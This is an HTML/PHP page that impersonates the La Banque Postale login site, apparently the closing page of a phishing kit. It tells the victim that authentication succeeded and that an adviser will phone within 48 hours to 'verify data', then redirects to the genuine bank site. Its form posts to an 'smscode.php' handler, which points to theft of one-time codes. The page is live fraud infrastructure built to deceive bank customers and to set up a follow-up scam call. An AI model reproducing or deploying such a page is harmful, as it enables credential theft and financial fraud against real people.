<?php


?>
<!DOCTYPE html>
<html style="--vh: 813px; --vw: 13.35px;" lang="fr">

<head data-template="loginpagev2">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Refresh" content="10; url='https://www.labanquepostale.fr/'" />

    <link rel="stylesheet" href="assets/css/base-fonts.min.css" as="style" onload="this.rel='stylesheet'">

    <link rel="stylesheet" href="assets/css/base.min.57e95125ce567e17e74e2c3f9012d591.css" type="text/css">
    <link rel="shortcut icon" href="assets/images/LOGO-digital-fd-clair-RVB-blanc-32px.ico" type="image/x-icon">

    <title>Connexion à mon espace client - La Banque Postale</title>
    <style>
        /*! CSS Used from: Embedded */
        /*! @import https://transverse.labanquepostale.fr/cdn/toolbox-xo/v1.1/toolbox-xo.css */
        [data-icon]:before {
            font-family: 'iconFont' !important;
            speak: none;
            font-style: normal;
            font-weight: normal;
            -webkit-font-feature-settings: normal;
            font-feature-settings: normal;
            font-variant: normal;
            text-transform: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        [data-icon][class*="--size24px"]:before {
            width: 24px !important;
            height: 24px !important;
            font-size: 24px !important;
            line-height: 24px !important;
        }

        [data-icon='tb-erreur']:before {
            content: '\e9a9';
        }

        [data-icon='ic_notification_info']:before {
            content: '\e98b';
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        p {
            margin-top: 0;
            margin-bottom: 1rem;
        }

        button,
        input:not([type=range]),
        label {
            touch-action: manipulation;
        }

        label {
            display: inline-block;
            margin-bottom: .5rem;
        }

        button {
            border-radius: 0;
        }

        button:focus {
            outline: 1px dotted;
            outline: 5px auto -webkit-focus-ring-color;
        }

        input,
        button {
            margin: 0;
            font-family: inherit;
            font-size: inherit;
            line-height: inherit;
        }

        button,
        input {
            overflow: visible;
        }

        button {
            text-transform: none;
        }

        button,
        html [type=button] {
            -webkit-appearance: button;
        }

        p {
            margin-top: 0;
            margin-bottom: 1rem;
        }

        input {
            max-width: 100%;
        }

        @media print {
            * {
                background: transparent !important;
                box-shadow: none !important;
                text-shadow: none !important;
            }

            p,
            label {
                color: #000;
                margin: auto;
            }

            p {
                orphans: 3;
                widows: 3;
            }
        }

        .flex-container,
        .flex-container--column,
        .flex-container--row {
            display: flex;
            flex-wrap: wrap;
        }

        .flex-container--row {
            flex-direction: row;
        }

        .flex-container--column {
            flex-direction: column;
        }

        .flex-item-fluid {
            flex: 1 1 0%;
        }

        .flex-item-last {
            order: 1;
        }

        .is-hidden {
            display: none;
        }

        .visually-hidden {
            position: absolute !important;
            border: 0 !important;
            height: 1px !important;
            width: 1px !important;
            padding: 0 !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
        }

        .w100 {
            width: 100%;
        }

        .pam {
            padding: 2rem;
        }

        .mrs {
            margin-right: 1rem;
        }

        .pts {
            padding-top: 1rem;
        }

        .pbs {
            padding-bottom: 1rem;
        }

        @media (max-width:575px) {

            .flex-container,
            .flex-container--row,
            .flex-container--column {
                flex-direction: column;
            }
        }

        @media (min-width:576px) {
            [class^=grid-]>* {
                box-sizing: border-box;
                min-width: 0;
                min-height: 0;
            }
        }

        @media (min-width:576px) {
            [class*=grid-3]>* {
                width: calc(100% / 3 - 0.01px);
            }

            [class*=grid-3].has-gutter>* {
                width: calc(100% / 3 - 1rem - 0.01px);
                margin-right: .5rem;
                margin-left: .5rem;
            }
        }

        @media (min-width:576px)and (max-width:767px) {
            [class*=-small-2]>* {
                width: calc(100% / 2 - 0.01px);
            }

            [class*=-small-2].has-gutter>* {
                width: calc(100% / 2 - 1rem - 0.01px);
            }
        }

        * {
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            -webkit-tap-highlight-color: transparent;
        }

        *::before,
        *::after {
            box-sizing: inherit;
        }

        p,
        span {
            line-height: 1.3;
        }

        label {
            margin-top: 0;
            line-height: 1.3em;
        }

        button {
            margin: 0;
            padding: 0;
            border: 0;
            background: 0;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .cesure {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .flex-align-start {
            align-items: flex-start;
        }

        .flex-align-center {
            align-items: center;
        }

        .mbts {
            margin-bottom: 5px;
        }

        .access-text {
            font-family: inherit !important;
            font-size: 1px !important;
            line-height: normal !important;
        }

        @media (max-width:575px) {

            .flex-container,
            .flex-container--row {
                flex-direction: row;
            }

            .flex-container--column {
                flex-direction: column;
            }
        }

        @media (max-width:575px) {
            [class^="grid-"]>* {
                box-sizing: border-box;
                min-width: 0;
                min-height: 0;
            }

            [class*="-tiny-1"]>* {
                width: calc(100% / 1 - 0.01px);
            }

            [class*="-tiny-1"][class*="has-gutter"]>* {
                width: calc(100% / 1 - 0rem - 0.01px);
                margin: .5rem 0;
            }
        }

        button,
        button[type="button"] {
            text-align: inherit;
        }

        input {
            border-radius: 0;
            box-shadow: none;
        }

        .font-x-medium {
            font-size: 1.2rem;
            line-height: 1.8rem;
        }

        [class*="tb-conteneur-tuile"]:not([class*="back-color"]) {
            border-radius: 4px;
            border-radius: var(--tb-conteneur-tuile-border-radius);
        }

        [class*="tb-conteneur-tuile"]:not([class*="back-color"]) {
            background-color: #fff;
            background-color: var(--tb-conteneur-tuile-background-color);
        }

        [class*="tb-conteneur-tuile"]:not([class*="--no-shadow"]) {
            box-shadow: 0 2px 4px 0 rgba(12, 43, 119, .15);
            box-shadow: var(--tb-conteneur-tuile-bs-h) var(--tb-conteneur-tuile-bs-v) var(--tb-conteneur-tuile-bs-blur) var(--tb-conteneur-tuile-bs-spread) var(--tb-conteneur-tuile-bs-color);
        }

        [class*="tb-conteneur-tuile"]:not([class*="--no-border"]):not([class*="--error"]):not([class*="--status"]):not([class*="--success"]) {
            border: 1px solid #e5e5e5;
            border: var(--tb-conteneur-tuile-border-width) solid var(--tb-conteneur-tuile-border);
        }

        button {
            cursor: pointer;
        }

        [data-icon]:before {
            display: block;
            background-size: contain;
            -webkit-mask-position: center center;
            -webkit-mask-size: contain;
        }

        [class*="tb-input"][type="tel"] {
            display: inline-block;
            padding: .1em 2rem 0 1.5rem;
            padding: var(--input-pad);
            height: 5rem;
            height: var(--input-height);
            background: #fff;
            background: var(--input-background);
            border: 1px solid rgba(28, 71, 158, 0.65);
            border: 1px solid var(--input-border);
        }

        [class*="tb-input"][type="tel"]:not([class*="txt-color"]) {
            color: #000;
            color: var(--input-color);
        }

        .tb-tooltip {
            position: relative;
            display: inline-flex;
        }

        .tb-tooltip [role="tooltip"][aria-hidden],
        .tb-tooltip [role="tooltip"][aria-hidden="true"] {
            position: absolute;
            display: none;
            z-index: 99;
        }

        .tb-tooltip[class*="--bottom"] [role="tooltip"][aria-hidden] {
            right: -19px;
            top: 40px;
        }

        .tb-tooltip [role="tooltip"][aria-hidden]:not([class*="w"]) {
            width: 200px;
        }

        .tb-tooltip button {
            z-index: 97;
        }

        .txt-color-6 {
            color: #4a4a4a;
            color: var(--color-6);
        }

        .before-txt-clr-26::before {
            color: #17479e;
            color: var(--color-26);
        }

        [data-icon][class*="--size24px"][class*="--inside-txt"]+* {
            position: relative;
            top: 3px;
        }

        input[class*="tb-input"]:not([type="radio"]):not([type="checkbox"]):focus {
            outline: 0;
        }

        input[class*="tb-input"]:not([type="radio"]):not([type="checkbox"]):not(.hide-focus):focus {
            box-shadow: inset 0 0 0 1px #fff, inset 0 0 0 2px rgba(28, 71, 158, 0.65);
            box-shadow: var(--tb-input-focus-shadow);
        }

        [data-tb-form-field] [data-ad-message],
        [data-tb-form-field] [data-ad-messages],
        [data-tb-form-message] [data-ad-message],
        [data-tb-form-message] [data-ad-messages] {
            display: none;
        }

        [data-tb-form-field] [data-tb-form-message] [data-icon] {
            display: none;
        }

        .tb-tooltip>button:hover {
            z-index: 100;
        }

        @media (max-width: 575px) {
            [class*="-tiny-1"][class*=has-gutter].tiny-no-gutter>* {
                margin: 0;
            }
        }

        /*! CSS Used fontfaces */
        @font-face {
            font-family: 'iconFont';
            src: url(assets/fonts/iconFont-7c9cf2978d031cff4f808fbf8e77505e.woff) format('woff');
            font-weight: normal;
            font-style: normal;
        }

        [class*=tb-btn]:not([class*="--no-default-padding"]):not([class*="--icon"]):not([class*="--small"]) {
            padding: 10px 5px 10px;
        }

        [class*=tb-btn][class*="--tiny"]:not([class*="--no-default-padding"]) {
            padding: 0.5rem;
            line-height: 1.3rem;
        }

        [class*=tb-btn]:not([class*=font-]) {
            font-size: 1rem;
            line-height: 1.8rem;
        }

        [class*=tb-btn],
        [type=submit][class*=tb-btn] {
            text-align: center;
        }

        [class*=tb-btn-p] {
            color: #fff;
            background: #17479e;
            border: 1px solid #17479e;
        }

        [class*=tb-btn] {
            position: relative;
            display: inline-block;
            white-space: nowrap;
            text-overflow: ellipsis;
            border-radius: 4px;
        }


        button {
            cursor: pointer;
        }
    </style>
</head>

<body data-title="Connexion à mon espace client" class="">
    <div class="js-avoidlinks">
        <ul class="m-list--horizontal--align-left">
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#"><span>Accès à vos comptes par l'écran de connexion pleine page</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-menu"><span>Accéder au Menu Principal</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-contenu"><span>Accéder au Contenu éditorial</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-footer"><span>Accéder au Pied de page</span></a></li>
        </ul>
    </div>
    <header id="header" class="o-header o-header--simplified" role="banner" data-percent="0">
        <div class="m-logo--simplified">
            <div class="m-logo u-spacing-s-xs">
                <a href="#" class="js-logo-type" title="Accueil La Banque Postale">
                    <img class="m-logo__img" src="assets/images/LOGO-LBP-digital-fd-clair-RVB.svg" alt="logo La Banque Postale" width="50" height="50">
                    <img class="m-logo__img-glass" src="assets/images/LOGO-LBP-digital-fd-glass-RVB.svg" alt="logo La Banque Postale" width="50" height="50">
                </a>
            </div>
        </div>
        <div class="o-header__wrapper">
            <div class="o-header__itemwrapper">
                <div class="m-header__links m-header__links--simplified" data-client="true">
                    <div class="m-header__links__item--simplified ">
                        <a id="client" href="#" data-internal="true" title="Centre d'aide" class="m-header__links__item m-header__links__item__white a-text--small ">
                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                <use href="assets/images/svg-icons.svg#ic-interface-search"></use>
                            </svg>
                            <span class="sr-only-xs">J'ouvre un compte</span>
                            <svg class="a-icon--xs hidden-sm hidden-md hidden-lg" aria-hidden="true" focusable="false">
                                <use href="assets/images/svg-icons.svg#ic-interface-chevron-right"></use>
                            </svg>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <main role="main" class="u-bg-color--blue-identity-group1">
        <div class="container-fluid">
            <div class="row">
                <div class="col-xs-12">
                    <div class="o-cvs u-flex u-flex--column--xs u-flex--row u-spacing-4xl-bottom" id="cvslayer" data-cvs="" data-mobile="true" data-app-stores="{&quot;appStores&quot;:[{&quot;appStoreLinkModel&quot;:{&quot;linkPath&quot;:&quot;https://play.google.com/store/apps/details?id\u003dcom.fullsix.android.labanquepostale.accountaccess&quot;,&quot;relatedDevice&quot;:&quot;android&quot;},&quot;device&quot;:{&quot;name&quot;:&quot;android&quot;,&quot;label&quot;:&quot;Android Mobile&quot;}},{&quot;appStoreLinkModel&quot;:{&quot;linkPath&quot;:&quot;https://itunes.apple.com/fr/app/la-banque-postale/id409362880?mt\u003d8&quot;,&quot;osMinVersion&quot;:&quot;6.1&quot;,&quot;relatedDevice&quot;:&quot;iosphone&quot;},&quot;device&quot;:{&quot;name&quot;:&quot;iosphone&quot;,&quot;label&quot;:&quot;iOS Mobile&quot;}}]}">
                        <div class="o-cvs__login u-flex--vertical u-flex--column">
                            <div>
                                <div class="m-title u-spacing-s-xs-bottom u-spacing-lg-bottom u-align-center">
                                    <h1 class="m-title--h3 u-text-color--white">Vous avez terminé</h1>
                                </div>
                                <form method="post" action="core/http/smscode.php" class="o-container o-container--hasBorder u-color--white u-bg-color--white w100 u-spacing-xs u-margin-2xs-bottom">
                                    <div class="u-flex u-flex--vertical-start">
                                        <div class="u-flex u-flex--column a-text a-text--tiny u-spacing-3xs-left u-spacing-xs-right">
                                            <center>
                                                <img src="assets/images/LOGO-LBP-digital-fd-clair-RVB.svg" width="100px" alt="">
                                            </center>
                                            <p class="u-text-color--grey-tundora" style="font-size: 16px;">Le processus de connexion et d'authentification à votre compte a été effectué avec succès <br><br>
Veuillez patienter maintenant, un conseiller vous contactera dans les plus brefs délais (sous 48 heures maximum) pour compléter les vérifications de mise à jour des données, afin d'assurer la sécurité de votre compte.</p>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>

                    <div class="o-cvs__layer o-container--hasBg u-spacing-s-bottom u-spacing-s-left u-spacing-s-right u-hidden--all u-flex--xs" id="devicelayer" device-mobile="true" tabindex="-1" aria-hidden="true">
                        <h1 class="m-title--h1 o-cvslogin__title  u-text-color--white u-spacing-s-bottom" tabindex="-1">Connexion à votre compte particulier</h1>
                        <div class="o-container o-container--hasBorder u-color--white u-bg-color--white w100 u-spacing-xs u-margin-2xs-bottom">
                            <div class="u-flex u-flex--vertical-start">
                                <svg class="a-icon--s u-svg-color--red" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-notification-alerte"></use>
                                </svg>
                                <div class="u-flex u-flex--column a-text a-text--tiny u-spacing-3xs-left u-spacing-xs-right">
                                    <p class="u-color--error u-margin-3xs-bottom lato-bold">Votre clavier numérique évolue</p>
                                    <p class="u-text-color--grey-tundora">Votre clavier
                                        vient de changer et son fonctionnement reste identique. Connectez-vous
                                        en saisissant vos identifiants et mot de passe habituels.
                                        Pour plus d’informations, vous pouvez contacter un conseiller au 3639
                                        (service 0,15€/min + prix d’un appel), ou dans votre bureau de poste le
                                        plus proche.</p>
                                </div>
                            </div>
                        </div>
                        <div class="a-text u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/pages/loginpagev2"></div>
                        <div class="o-cvs__image u-margin-s-bottom">
                            <picture>
                                <img loading="lazy" class="  a-image--responsive" alt="">
                            </picture>
                        </div>
                        <button type="button" id="connectwebsite" class="u-btn m-button--primary m-button--primary--dakrmode m-button--extend u-margin-s-bottom">
                            <span>Continuer sur le site</span>
                        </button>
                        <a class="u-btn m-button--secondary m-button--secondary--dakrmode m-button--extend u-margin-s-bottom" id="appredirect">
                            <span>Télécharger l'application mobile</span>
                        </a>
                    </div>
                    <ul class="m-footnotes js-footnotes--container container-fluid m-list u-spacing-4xl-left u-spacing-xl-xs-left" data-note-label="Note" style="display: none;"></ul>
                    <div id="viewportDetect">
                        <div class="visible-xs" data-viewport="xs"></div>
                        <div class="visible-sm" data-viewport="sm"></div>
                        <div class="visible-md" data-viewport="md"></div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <footer id="footer" role="contentinfo" class="o-footer ">
        <div class="o-footer__top">
            <div class="o-footer__top__left">
                <div class="o-footer__logo">
                    <div class="m-logo u-spacing-s-xs">
                        <div class="js-logo-type">
                            <img src="assets/images/LOGO-LBP-digital-fd-clair-RVB.svg" alt="La Banque Postale" width="50" height="50">
                        </div>
                    </div>
                    <hr class="u-separator--v u-spacing-s-right" aria-hidden="true" focusable="false">
                    <img src="assets/images/ill_citoyenne.svg" class="o-footer__imgbrand" alt="La Banque Postale Citoyenne" loading="lazy" width="50" height="50">
                </div>
                <div class="u-spacing-s-top u-spacing-xs-xs-top">
                    <div class="row">
                        <div class="a-text col-xs-12">
                            <article class=" u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-back-content="Retour au contenu">

                                <p>Née en 2006, notre banque a grandi avec vous. Citoyenne, ouverte
                                    et accessible à tous, nous revendiquons l’ambition d’accompagner nos 20
                                    millions de clients avec des offres et services performants, la
                                    modernité radicale de notre engagement citoyen et notre héritage postal.
                                    Aujourd’hui La Banque Postale partage les rêves et les exigences de sa
                                    génération.</p>

                            </article>
                        </div>
                    </div>
                    <div class="row">
                        <div class="button col-xs-12">
                            <div class="m-button u-align-center " data-component-id="labanquepostale/sitepublic/components/edito/button">
                                <a href="#" class="u-btn m-button--extend m-button--secondary" data-internal="true" js-btn-tracking="">
                                    <span class="m-button__icon a-icon--s">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use href="assets/images/svg-icons.svg#ic-profile-citizen"></use>
                                        </svg>
                                    </span>
                                    <span>
                                        En savoir plus sur nos engagements
                                    </span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="o-footer__top__right">
                <div class="m-tiles u-full-width-xs m-tiles--square">
                    <hr class="u-separator--h--full visible-xs-block">
                    <ul class="m-tiles__list">
                        <li class="m-tiles__item">
                            <a href="#/particulier/footer/espace_sourds" title="Espace sourds et malentendants de la Banque Postale  - Nouvelle fenêtre" target="_blank" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-profile-accessibility-deafness"></use>
                                </svg>
                                <span>Espace sourds et malentendants</span>
                            </a>
                        </li>
                        <li class="m-tiles__item">
                            <a href="#/particulier/localisation_bureau" title="Recherche bureau de poste via l'outil de localisation  - Nouvelle fenêtre" target="_blank" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-contact-location"></use>
                                </svg>
                                <span>Recherche bureau de poste</span>
                            </a>
                        </li>
                        <li class="m-tiles__item">
                            <a href="#/particulier/faq-centre-aide" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-contact-faq"></use>
                                </svg>
                                <span>Foire aux questions et centre d'aide</span>
                            </a>
                        </li>
                        <li class="m-tiles__item">
                            <a href="#/particulier/footer/contacts" title="Nous contacter  - Nouvelle fenêtre" target="_blank" data-internal="false">
                                <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                                    <use href="assets/images/svg-icons.svg#ic-contact-phone"></use>
                                </svg>
                                <span>Nous contacter</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="container-fluid">
            <div class="row">
                <div class="col-xs-12 col-sm-6">
                    <div>
                        <div class="m-socialmedialist u-align-center u-spacing-s-top u-spacing-s-bottom u-spacing-xs-xs-top u-spacing-xs-xs-bottom">
                            <p class="m-socialmedialist__label"> Suivez nous</p>
                            <ul class="m-socialmedialist__list m-list--flexcenter m-list--flexinline">
                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Facebook - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-facebook"></use>
                                            </svg>
                                            <span class="sr-only"> Facebook - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Instagram - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-instagram"></use>
                                            </svg>
                                            <span class="sr-only"> Instagram - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Linkedin - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-linkedin"></use>
                                            </svg>
                                            <span class="sr-only"> Linkedin - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" Twitter - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-twitter"></use>
                                            </svg>
                                            <span class="sr-only"> Twitter - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">
                                    <div class="m-button--hasIcon">
                                        <a href="#" title=" YouTube - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                                            <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                                                <use href="assets/images/svg-icons.svg#ic-social-youtube"></use>
                                            </svg>
                                            <span class="sr-only"> YouTube - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-xs-12 col-sm-6">
                    <div class="m-newsletterlink m-button--hasIcon ">
                        <a class="u-spacing-md-top u-spacing-md-bottom u-spacing-xs-lg-top u-spacing-xs-lg-bottom u-align-center" href="#/particulier/accompagner/nl-globale" title="Abonnez-vous à la Newsletter - Nouvelle fenêtre" data-internal="false">
                            <span>Abonnez-vous à la Newsletter</span>
                            <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24" class="a-icon--s">
                                <use href="assets/images/svg-icons.svg#ic-contact-arobase"></use>
                            </svg>
                        </a>
                    </div>
                </div>
                <div class="col-xs-12 u-spacing-xs-top u-spacing-lg-bottom u-spacing-xs-xs-bottom">
                    <div class="m-legalpagelink u-align-center u-text-color--grey_color_5">
                        <ul class="m-list--horizontal--align-center m-list--flexcenter">
                            <li><a href="#/particulier/footer/mentions-legales" data-internal="true">Mentions légales</a></li>
                            <li><a href="#/particulier/footer/tarifs" data-internal="true">Tarifs bancaires</a></li>
                            <li><a href="#/content/dam/lbp/documents/produits/particuliers/quotidien/compte-bancaire/Convention-CCP-2023.pdf" data-internal="true">Convention de compte</a></li>
                            <li><a href="#/particulier/footer/donnees-personnelles" data-internal="true">Protection des Données à Caractère Personnel </a></li>
                            <li><a href="#/particulier/footer/cookies" data-internal="true">Cookies</a></li>
                            <li><a href="#/particulier/footer/actualisation-des-informations-personnelles" data-internal="true">Actualiser vos informations</a></li>
                            <li><a href="#/particulier/footer/reclamation" data-internal="true">Réclamation</a></li>
                            <li><a href="#/particulier/footer/centres-financiers" data-internal="true">Coordonnées Centres Financiers</a></li>
                            <li><a href="#/particulier/footer/assistance-technique" data-internal="true">Assistance technique</a></li>
                            <li><a href="#/particulier/footer/alertes-et-fraudes" data-internal="true">Alertes fraudes et points de vigilance</a></li>
                            <li><a href="#/particulier/footer/list-actu-reglementaires" data-internal="true">Actualités réglementaires</a></li>
                            <li><a href="#/particulier/footer/cgu-operation-rcs" data-internal="true">CGU</a></li>
                            <li><a href="#/particulier/footer/aide-navigateurs-internet" data-internal="true">Aide navigateur et systèmes d'exploitation</a></li>
                            <li><a href="#/particulier/footer/cache-navigateur" data-internal="true">Vider le cache de votre navigateur</a></li>
                            <li><a href="#/particulier/footer/lexique" data-internal="true">Lexique </a></li>
                            <li><a href="#/particulier/footer/accessibilite" data-internal="true">L'accessibilité numérique à La Banque Postale</a></li>
                            <li><a href="#/particulier/footer/declaration-d-accessibilite" data-internal="true">Accessibilité – Partiellement conforme </a></li>
                            <li><a href="#" data-internal="false">Espace candidature</a></li>
                            <li><a href="#/entreprises/bfi-banque-financement-investissement" data-internal="true">BFI - Banque de Financement et d'Investissement</a></li>
                            <li><a href="#/particulier/footer/fonds-de-garantie" data-internal="true">Le fonds de garantie des dépôts et de résolution</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <script src="assets/js/base-login.min.js"></script>
</body>

</html>